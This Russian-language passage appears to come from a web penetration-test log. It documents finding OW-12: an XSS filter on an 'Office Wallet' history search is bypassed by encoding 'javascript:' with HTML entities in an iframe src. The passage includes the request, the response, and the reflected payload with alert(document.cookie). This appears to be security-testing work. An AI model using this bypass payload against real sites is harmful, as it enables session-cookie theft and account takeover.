== 5. OW-12: обход HTML-сущностью: javascript: пишем через сущности ==
    · Фильтр ищет буквальную строку 'javascript:', и заодно в ней есть подстрока
    · 'script' — то есть вырезается она целиком, даже если заменить буквы на
    · сущности, надо ломать и 'script'. В атрибутах браузер декодирует сущности
    · уже после фильтра, поэтому в исходнике нет ни одной запрещённой строки, а
    · схема в браузере собирается заново:
    → GET /history?q=<iframe src=&#106;ava&#115;cript:...>  (сущности вместо j и s)
    ← HTTP 200  <!DOCTYPE html> <html lang="ru"> <head>   <meta charset="utf-8">   <meta name="viewport" content="width=device-width, initial-scale=1">   <title>История · Office Wallet</title>   <link rel="preconnect" href="https://fonts.googleapis.com"> ...
    ┌─ АРТЕФАКТ · OW-12 · HTML entities проходят фильтр и остаются в ответе
    │ GET /history?q=<iframe src=entities> → HTTP 200
    │ HTML payload в ответе: <iframe src="&#106;ava&#115;cript:alert(document.cookie)"></iframe>
    └─
[+] javascript: через сущности прошёл фильтр
